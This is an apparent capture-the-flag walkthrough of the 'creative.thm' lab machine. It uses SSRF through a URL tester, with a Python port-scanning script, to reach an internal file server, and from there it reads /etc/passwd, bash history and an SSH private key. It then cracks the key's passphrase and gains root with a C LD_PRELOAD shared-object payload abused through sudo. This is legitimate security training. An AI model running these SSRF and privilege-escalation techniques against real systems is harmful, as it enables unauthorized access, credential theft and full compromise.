## Nmap Scan

Running nmap scan on the machine, we have

```
we have 2 open ports `ssh` and `http`; From the result above also, we notice a domain name associated with the IP `creative.thm`.

## Enumeration

### Port 80

Navigating to the web service using either the IP or domain name `creative.thm`, we're greeted with this page

[screenshot http service]

From webpage, we noticed it is a static site and couldn't get any information as well from the source code. Let's check for hidden directories, if we'll find any

_NB:_ I had to add `creative.thm` as an entry to our hosts file to run the gobuster scan

[screenshot hosts]

[screenshot gobuster_dir]

The only endpoint found is `/assets` which does return a 403 error code and doesn't prove too useful. Since there's an associated domain name, we could enumerate for sub-domains as well using gobuster's `vhost` mode.

[screenshot gobuster_vhost]

Found a `beta.creative.thm` subdomain almost immediately, finally a lead [smile emoji]

- _NB:_ If you don't already have, install seclists using `sudo apt install seclists` to have access to the extensive wordlists used.

_a little explanation_

- Virtual host enumeration involves finding all virtual hosts associated with an IP address or domain.

Navigating to the sub-domain found (but before that, we need to also add it to our hosts file as we did earlier), we have this

A URL tester? [thinking emoji]

Couldn't figure out how best to use this, so i decided to host a php reverse shell with python server and see if it'll parse the URL and give RCE

[screenshot local_server]

[screenshot url]

It didn't give RCE rather just showed the file contents in plain text

[GIF confused]

After much back and forth, tried to access `http://localhost` from the URL tester and got the basic HTML version of the creative.thm website

[screenshot html]

Tried accessing it again but this time using a port `http://localhost:80` and it gave the same result. I got the idea of looping through the ports from 1 - 65535 to see if there's any exposed file system.

Only way to do this with speed is using burp intruder, starting with the first 1000 ports as payload

[screenshot 1-1000]

The first 1000 ports didn't return any leads except for port 80 which we've seen earlier. 

The process was very slow with the burp community version, so i searched for alternatives and found this python script that can be used to loop through the 65000 ports in a blink

```python
import requests
import urllib.parse
from concurrent.futures import ThreadPoolExecutor

def send_post_request(url, payload, headers):
    try:
        response = requests.post(url, data=payload, headers=headers)
        content_length = response.headers.get('Content-Length')
        if content_length != '13':  # Check if content length isn't 13
            print(f"POST request to {url} with payload {payload} returned status code: {response.status_code}, content length: {content_length}")
    except requests.exceptions.RequestException as e:
        print(f"Error sending POST request: {e}")

def main():
    base_url = "http://beta.creative.thm"
    headers = {
        "Host": "beta.creative.thm",
        "Content-Length": "38",
        "Cache-Control": "max-age=0",
        "Upgrade-Insecure-Requests": "1",
        "Origin": "http://beta.creative.thm",
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "Sec-GPC": "1",
        "Accept-Language": "en-GB,en;q=0.9",
        "Referer": "http://beta.creative.thm/",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "close"
    }

    # Using ThreadPoolExecutor to run 20 threads concurrently
    with ThreadPoolExecutor(max_workers=20) as executor:
        for port_number in range(1000, 65536):
            url = f"http://localhost:{port_number}"
            payload = f"url=http%3A%2F%2Flocalhost%3A{port_number}"
            executor.submit(send_post_request, base_url, payload, headers)

if __name__ == "__main__":
    main()
```
_Explanation_

- The reason why it checked for a request that doesn't return a content length of 13 is that a non existent port/request returns 13 as its content length as seen in the captured requests below

[screenshot request]

- The headers used we're also from the captured request in burp, so modify it to your own header

_NB:_ I also didn't start from port 1 rather 1000 since i already ran through those in burpsuite but you might want to start from 1

Running the python script

[screenshot script]

We can see port 1337 didn't return a content length of 13, navigating to `http://localhost:1337`

[screenshot 1337]

Voila! we get a file system served on this port; now we can start tweaking our requests to the URL tester and see what we can get. Starting with `http://localhost:1337/etc/passwd`

[screenshot passwd]

We can see a standard user `saad` in the passwd file, tried accessing the home directory

[screenshot home]

Poaching further into `saad` directory and we can see the user flag `user.txt` without having initial access yet

[screenshot saad]

From the listing, we can also see a `start_server.py` script, viewing the file and it shows that its the script used to serve the file system on port `1337`

[screenshot start_server]

While pivoting the file system, found ssh keys for user `saad`

[screenshot saad_ssh]

let's copy the `id_rsa` file and use it to authenticate as user `saad`

NB: copy from the page source to get the right format of the key

[screenshot id_rsa]

## Initial Access
Set the permission for the key to user read & write only `chmod 600` so we can use it to authenticate.

I like exhaustive sweeping, so I somehow went back to saad's home folder and checked the `.bash_history` file

[screenshot bash_history]

Voila! there lies his password; but unable to use it to authenticate, so let's stick to the rsa file

[screenshot rsa_protected]

Found the id_rsa key to have a passphrase, so we'll have to create a john compatible hash with `ssh2john` and crack it

```bash
‚îå‚îÄ‚îÄ(sixth-sensei„âøsenseisec)-[~/THM/Creative]
‚îî‚îÄ$ ssh2john id_rsa > idrsa_john.txt
```
[screenshot rsa_crack]

Now that we got the rsa file passphrase, let's authenticate again as saad

[screenshot user-shell] 

## Privilege Escalation

Checking saad's privilege on the machine, we have

[screenshot sudo-l]

We can notice `LD_PRELOAD` is present in `env_keep`, let's craft our exploit by creating a simple c script

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init()
{
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```
Save and compile the script as a shared object `.so` using `gcc -fPIC -shared [exploitname].c -o [exploitname].so -nostartfiles`

[screenshot shell_code]

Now we can simply set a new path for `LD_PRELOAD` and run this script as a command the user has sudo privileges on, which in this case is `ping`

[screenshot root-shell]

....and we're root! Listing the directory

[screenshot rootflag]

We can see our root flag, that marks the end h4x0r [rocket emoji]
